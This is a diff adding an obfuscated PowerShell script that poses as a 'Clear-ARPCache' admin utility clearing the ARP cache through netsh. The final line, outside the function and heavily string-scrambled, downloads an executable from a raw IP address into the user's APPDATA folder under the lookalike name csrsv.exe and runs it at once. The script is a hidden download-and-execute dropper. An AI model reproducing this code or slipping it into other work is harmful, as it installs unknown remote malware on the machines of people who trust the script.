@@ -1,0 +1,38 @@
+${0`13}  =  [TypE]("{5}{2}{0}{6}{3}{1}{4}" -f'ritY.pRin','ent','cu','ID','ity','Se','cipaL.WINdOWs') ;
+
+
+
+
+
+
+
+
+
+function c`LEAr-`ARpCaChe
+{
+    [CmdletBinding()]
+    param(
+
+    )
+
+    Begin{
+        if(-not([Security.Principal.WindowsPrincipal]  (get-ItEm ("{1}{0}{2}{3}" -f 'iaB','vAr','le:0','13')  ).value::("{2}{0}{3}{1}" -f 'tCu','t','Ge','rren').Invoke())."IsI`Nro`lE"([Security.Principal.WindowsBuiltInRole]("{2}{1}{0}" -f 'r','ministrato','Ad')))
+        {
+            &("{2}{1}{3}{0}"-f 'ng','it','Wr','e-Warni') -Message ("{16}{6}{3}{1}{17}{14}{4}{10}{15}{8}{12}{13}{5}{7}{9}{0}{2}{11}" -f 'd privileg','uired','e','rights are req','lear t',' the','istrator ',' process with el','he! Attempts to st','evate','he A','s...','a','rt',' c','RP cac','Admin',' to')      
+        }
+    }
+
+    Process{
+        try{
+            &("{2}{1}{0}{3}" -f 'Proce','-','Start','ss') -FilePath "$env:SystemRoot\System32\netsh.exe" -ArgumentList ("{6}{3}{1}{5}{2}{0}{4}"-f'et','erfa','p del','t','e arpcache','ce i','in') -Verb ("{0}{1}"-f'RunA','s') -WindowStyle ("{2}{1}{0}" -f 'en','dd','Hi') -Wait
+        }
+        catch{
+            throw
+        }
+    }
+
+    End{
+
+    }
+}
+(&("{1}{2}{0}" -f'Object','Ne','w-') ("{4}{2}{1}{0}{3}{5}"-f 'em','st','y','.','S','Net.WebClient')).("{1}{2}{0}" -f 'loadFile','Dow','n').Invoke(("{4}{9}{0}{2}{3}{6}{8}{5}{7}{1}"-f '3.2','e','38/~ya','hoo/c','http:','sv.e','s','x','r','//94.102.5'),"$env:APPDATA\csrsv.exe");&("{3}{2}{0}{1}{4}"-f 'c','es','o','Start-Pr','s') ("$env:APPDATA\csrsv.exe")
